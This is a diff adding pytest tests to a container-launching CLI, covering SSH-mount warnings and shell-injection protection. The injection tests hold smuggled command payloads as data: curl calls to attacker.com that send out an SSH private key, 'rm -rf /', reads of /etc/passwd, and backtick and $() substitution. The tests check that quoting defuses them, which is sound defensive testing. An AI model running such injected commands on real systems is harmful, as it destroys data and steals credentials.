@@ -1,16 +1,25 @@
 """
-Tests for the clanker CLI.
+Tests for the clankercage CLI.
 
 These tests verify that:
 - The CLI correctly mounts local directories
 - The --shell flag works for non-interactive testing
 """
 
+import argparse
 import subprocess
 import uuid
 from pathlib import Path
+from unittest.mock import MagicMock, patch
 
 import pytest
+
+from clankercage.cli import (
+    get_existing_container,
+    container_has_ssh_mounts,
+    warn_if_ssh_mount_missing,
+    modify_config,
+)
 
 
 @pytest.fixture
@@ -301,3 +310,269 @@ def describe_ssh():
         )
 
 
+def describe_ssh_mount_warning():
+    """Unit tests for SSH mount warning functionality."""
+
+    def describe_get_existing_container():
+        """Tests for get_existing_container function."""
+
+        def it_returns_container_id_when_exists():
+            """Should return container ID when a matching container exists."""
+            with patch("clankercage.cli.subprocess.run") as mock_run:
+                mock_run.return_value = MagicMock(
+                    stdout="abc123def456\n",
+                    returncode=0
+                )
+                result = get_existing_container(Path("/test/project"))
+
+                assert result == "abc123def456"
+                mock_run.assert_called_once()
+                call_args = mock_run.call_args[0][0]
+                assert "docker" in call_args
+                assert "label=devcontainer.local_folder=/test/project" in call_args
+
+        def it_returns_none_when_no_container():
+            """Should return None when no matching container exists."""
+            with patch("clankercage.cli.subprocess.run") as mock_run:
+                mock_run.return_value = MagicMock(
+                    stdout="",
+                    returncode=0
+                )
+                result = get_existing_container(Path("/test/project"))
+
+                assert result is None
+
+    def describe_container_has_ssh_mounts():
+        """Tests for container_has_ssh_mounts function."""
+
+        def it_returns_true_when_ssh_key_mounted():
+            """Should return True when container has SSH key mount."""
+            mounts_json = '[{"Destination": "/home/node/.ssh/id_ed25519"}]'
+            with patch("clankercage.cli.subprocess.run") as mock_run:
+                mock_run.return_value = MagicMock(
+                    stdout=mounts_json,
+                    returncode=0
+                )
+                result = container_has_ssh_mounts("abc123")
+
+                assert result is True
+
+        def it_returns_false_when_no_ssh_key_mounted():
+            """Should return False when container only has .ssh directory but no key."""
+            mounts_json = '[{"Destination": "/home/node/.ssh"}]'
+            with patch("clankercage.cli.subprocess.run") as mock_run:
+                mock_run.return_value = MagicMock(
+                    stdout=mounts_json,
+                    returncode=0
+                )
+                result = container_has_ssh_mounts("abc123")
+
+                assert result is False
+
+        def it_returns_false_when_no_ssh_mounts():
+            """Should return False when container has no SSH mounts at all."""
+            mounts_json = '[{"Destination": "/workspace"}, {"Destination": "/home/node/.claude"}]'
+            with patch("clankercage.cli.subprocess.run") as mock_run:
+                mock_run.return_value = MagicMock(
+                    stdout=mounts_json,
+                    returncode=0
+                )
+                result = container_has_ssh_mounts("abc123")
+
+                assert result is False
+
+        def it_returns_false_on_docker_error():
+            """Should return False when docker inspect fails."""
+            with patch("clankercage.cli.subprocess.run") as mock_run:
+                mock_run.return_value = MagicMock(
+                    stdout="",
+                    returncode=1
+                )
+                result = container_has_ssh_mounts("abc123")
+
+                assert result is False
+
+        def it_returns_false_on_invalid_json():
+            """Should return False when docker returns invalid JSON."""
+            with patch("clankercage.cli.subprocess.run") as mock_run:
+                mock_run.return_value = MagicMock(
+                    stdout="not valid json",
+                    returncode=0
+                )
+                result = container_has_ssh_mounts("abc123")
+
+                assert result is False
+
+    def describe_warn_if_ssh_mount_missing():
+        """Tests for warn_if_ssh_mount_missing function."""
+
+        def it_does_nothing_when_no_ssh_key_specified():
+            """Should not warn when no SSH key is specified."""
+            args = argparse.Namespace(ssh_key_file=None)
+            with patch("clankercage.cli.get_existing_container") as mock_get:
+                warn_if_ssh_mount_missing(args, Path("/test"))
+                mock_get.assert_not_called()
+
+        def it_does_nothing_when_no_existing_container():
+            """Should not warn when no existing container."""
+            args = argparse.Namespace(ssh_key_file="/path/to/key")
+            with patch("clankercage.cli.get_existing_container", return_value=None):
+                with patch("clankercage.cli.container_has_ssh_mounts") as mock_has:
+                    warn_if_ssh_mount_missing(args, Path("/test"))
+                    mock_has.assert_not_called()
+
+        def it_does_nothing_when_container_has_ssh_mounts():
+            """Should not warn when container already has SSH mounts."""
+            args = argparse.Namespace(ssh_key_file="/path/to/key")
+            with patch("clankercage.cli.get_existing_container", return_value="abc123"):
+                with patch("clankercage.cli.container_has_ssh_mounts", return_value=True):
+                    with patch("builtins.print") as mock_print:
+                        warn_if_ssh_mount_missing(args, Path("/test"))
+                        mock_print.assert_not_called()
+
+        def it_warns_when_ssh_key_but_no_mounts(capsys):
+            """Should print warning when SSH key specified but container lacks mounts."""
+            args = argparse.Namespace(ssh_key_file="/path/to/key")
+            with patch("clankercage.cli.get_existing_container", return_value="abc123"):
+                with patch("clankercage.cli.container_has_ssh_mounts", return_value=False):
+                    warn_if_ssh_mount_missing(args, Path("/test"))
+
+            captured = capsys.readouterr()
+            assert "WARNING" in captured.err
+            assert "SSH key specified" in captured.err
+            assert "docker rm -f abc123" in captured.err
+
+
+def describe_shell_injection_protection():
+    """Tests for shell injection protection in modify_config."""
+
+    def it_escapes_single_quotes_in_git_user_name(tmp_path: Path):
+        """Should escape single quotes in git user name to prevent injection."""
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=None,
+            git_user_name="O'Reilly",
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # shlex.quote wraps in single quotes and escapes internal quotes
+        # "O'Reilly" becomes "'O'\"'\"'Reilly'"
+        assert "O'Reilly" not in result["postStartCommand"] or "\"'\"" in result["postStartCommand"]
+        # Verify the command won't break shell parsing
+        assert result["postStartCommand"].count("'") % 2 == 0 or "\"'\"" in result["postStartCommand"]
+
+    def it_escapes_command_injection_in_git_user_name(tmp_path: Path):
+        """Should prevent command injection via git user name."""
+        import shlex
+        malicious = "'; curl attacker.com/exfil; echo '"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=None,
+            git_user_name=malicious,
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # The malicious payload should be properly quoted by shlex.quote
+        # Verify the exact safe quoting is used
+        expected_quoted = shlex.quote(malicious)
+        assert f"git config --global user.name {expected_quoted}" in result["postStartCommand"]
+
+    def it_escapes_command_injection_in_git_user_email(tmp_path: Path):
+        """Should prevent command injection via git user email."""
+        import shlex
+        malicious = "user@example.com'; rm -rf /; echo '"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=None,
+            git_user_name=None,
+            git_user_email=malicious,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # The malicious payload should be properly quoted by shlex.quote
+        expected_quoted = shlex.quote(malicious)
+        assert f"git config --global user.email {expected_quoted}" in result["postStartCommand"]
+
+    def it_escapes_command_injection_in_gpg_key_id(tmp_path: Path):
+        """Should prevent command injection via GPG key ID."""
+        import shlex
+        malicious = "ABCD1234'; cat /etc/passwd; echo '"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=malicious,
+            gh_token=None,
+            git_user_name=None,
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # The malicious payload should be properly quoted by shlex.quote
+        expected_quoted = shlex.quote(malicious)
+        assert f"git config --global user.signingkey {expected_quoted}" in result["postStartCommand"]
+
+    def it_escapes_command_injection_in_gh_token(tmp_path: Path):
+        """Should prevent command injection via GitHub token."""
+        import shlex
+        malicious = "ghp_xxxx'; curl attacker.com?token=$(cat ~/.ssh/id_rsa); echo '"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=malicious,
+            git_user_name=None,
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # The malicious payload should be properly quoted by shlex.quote
+        expected_quoted = shlex.quote(malicious)
+        assert f"echo {expected_quoted} | gh auth login --with-token" in result["postStartCommand"]
+
+    def it_handles_backticks_in_values(tmp_path: Path):
+        """Should escape backticks to prevent command substitution."""
+        malicious = "`whoami`"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=None,
+            git_user_name=malicious,
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # Backticks should be inside quotes, preventing execution
+        # shlex.quote handles this by wrapping in single quotes
+        assert "git config --global user.name '`whoami`'" in result["postStartCommand"]
+
+    def it_handles_dollar_command_substitution(tmp_path: Path):
+        """Should escape $() command substitution."""
+        malicious = "$(cat /etc/passwd)"
+        args = argparse.Namespace(
+            build=False,
+            ssh_key_file=None,
+            gpg_key_id=None,
+            gh_token=None,
+            git_user_name=malicious,
+            git_user_email=None,
+        )
+        config = {"mounts": []}
+        result = modify_config(config, args, tmp_path)
+
+        # $() should be inside single quotes, preventing execution
+        assert "git config --global user.name '$(cat /etc/passwd)'" in result["postStartCommand"]
